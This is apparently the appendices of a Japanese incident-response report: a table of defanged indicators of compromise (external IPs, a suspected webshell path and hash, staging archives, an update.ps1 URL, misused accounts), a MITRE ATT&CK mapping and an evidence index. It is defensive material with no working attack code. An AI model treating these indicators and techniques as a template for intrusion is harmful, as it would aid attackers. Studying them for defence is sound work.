| 種別 | 値 | 概要/役割 | 確認箇所 |
|---|---|---|---|
| IP アドレス(外部送信元) | 198[.]51[.]100[.]77 | VPN接続元として確認されたIPアドレスです。 | EV-001, EV-004 |
| IP アドレス(外部送信元) | 198[.]51[.]100[.]50 | Webアクセス元として確認されたIPアドレスです。 | EV-009 |
| IP アドレス(外部宛先) | 203[.]0[.]113[.]88 | 外部送信先として確認されたIPアドレスです。 | EV-027, EV-034, EV-037 |
| ファイルパス | /var/www/html/uploads/shell.php | Webシェル疑いファイルのパスです。 | EV-011 |
| ファイルハッシュ(MD5 とみられる値) | 99b2d8b894775f3d7a2f99ff4f5e5c6a | EV-011 |
| ファイルパス | C:\ProgramData\stage\finance_20260501.7z | EV-030 |
| ファイルパス | C:\ProgramData\stage\batch.txt | EV-030, EV-033 |
| URL | hxxp://10.20.30.15/update.ps1 | EV-018 |
| アカウント | svc-vpn-backup(用途外使用の可能性) | EV-001, EV-005 |
| アカウント | adm-backup(調査期間中に作成) | EV-016 |

## 付録B. MITRE ATT&CK対応表

自動マッピング結果のうち、観測内容と直接対応するものを記載します。確度はいずれも可能性レベルであり、確定的な帰属を示すものではありません。

| 戦術 | テクニックID | テクニック名 | 関連証拠 |
|---|---|---|---|
| Execution | T1059.001 | PowerShell | EV-018, EV-019, EV-020 |
| Execution | T1059.003 | Windows Command Shell | EV-020, EV-021 |
| Discovery | T1087 | Account Discovery | EV-015, EV-019 |
| Lateral Movement | T1021.002 | SMB/Windows Admin Shares | EV-014 |
| Lateral Movement | T1021.004 | SSH | EV-008, EV-009 |
| Lateral Movement | T1021.001 | Remote Desktop Protocol | EV-036, EV-040 |
| Defense Evasion | T1070.001 | Clear Windows Event Logs | EV-017, EV-021 |
| Collection | T1560 | Archive Collected Data | EV-026, EV-030 |

## 付録C. 関連ファイル・別紙一覧

| 証拠ID | ソースパス | 行番号 |
|---|---|---|
| EV-001 | VPN/sslvpn.log.txt | 1-2 |
| EV-002 | VPN/sslvpn.log.txt | 4-6 |
| EV-003 | VPN/sslvpn.log.txt | 8-8 |
| EV-004 | VPN/vpn_radius.log.txt | 1-3 |
| EV-005 | VPN/vpn_config_export.txt | 11-12 |
| EV-006 | VPN/operator_chat_paste.txt | 14-15 |
| EV-007 | WEB01/access.log.txt | 3-6 |
| EV-008 | WEB01/auth.log.txt | 1-4 |
| EV-009 | WEB01/auth.log.txt | 5-5 |
| EV-010 | WEB01/syslog.txt | 2-4 |
| EV-011 | WEB01/webroot_file_listing.csv.txt | 4-4 |
| EV-012 | WEB01/analyst_notes.md | 8-8 |
| EV-013 | AD01/security_events.evtx.txt | 1-1 |
| EV-014 | AD01/security_events.evtx.txt | 3-3 |
| EV-015 | AD01/security_events.evtx.txt | 4-5 |
| EV-016 | AD01/security_events.evtx.txt | 6-7 |
| EV-017 | AD01/security_events.evtx.txt | 8-8 |
| EV-018 | AD01/powershell_operational.evtx.txt | 1-2 |
| EV-019 | AD01/powershell_operational.evtx.txt | 3-3 |
| EV-020 | AD01/sysmon_process_network.csv.txt | 4-4 |
| EV-021 | AD01/sysmon_process_network.csv.txt | 5-5 |
| EV-022 | AD01/analyst_notes.md | 12-13 |
| EV-023 | AD01/analyst_notes.md | 9-9 |
| EV-024 | AD01/freeform_investigation_notes.txt | 14-16 |
| EV-025 | FS01/edr_process_network.csv.txt | 3-3 |
| EV-026 | FS01/edr_process_network.csv.txt | 4-4 |
| EV-027 | FS01/edr_process_network.csv.txt | 5-6 |
| EV-028 | FS01/edr_process_network.csv.txt | 7-7 |
| EV-029 | FS01/file_access_summary.csv.txt | 2-4 |
| EV-030 | FS01/mft.csv.txt | 5-6 |
| EV-031 | FS01/usn_journal.csv.txt | 6-7 |
| EV-032 | FS01/analyst_notes.md | 8-9 |
| EV-033 | FS01/freeform_triage_notes.txt | 20-22 |
| EV-034 | Firewall/fw_traffic.csv.txt | 5-6 |
| EV-035 | Firewall/fw_traffic.csv.txt | 2-4 |
| EV-036 | Firewall/fw_traffic.csv.txt | 8-8 |
| EV-037 | Firewall/nat_session.log.txt | 2-3 |
| EV-038 | Firewall/blocked_events.log.txt | 1-2 |
| EV-039 | Firewall/firewall_admin_clipboard.txt | 13-15 |
| EV-040 | WIN10-023/security_events.evtx.txt | 3-4 |
| EV-041 | WIN10-023/browser_history.csv.txt | 4-4 |
| EV-042 | WIN10-023/helpdesk_ticket_notes.md | 13-14 |
| EV-043 | WIN10-023/analyst_notes.md | 5-5 |
| EV-044 | case_handoff_notes.md | 17-18 |

## 付録D. 証拠保全記録

<!-- レビュー担当者記入欄: 証拠保全作業の実施日時、対象、作業場所、作業者、立会人、使用機器、取得方法、ハッシュ値、保管場所を確認のうえ記載してください。 -->
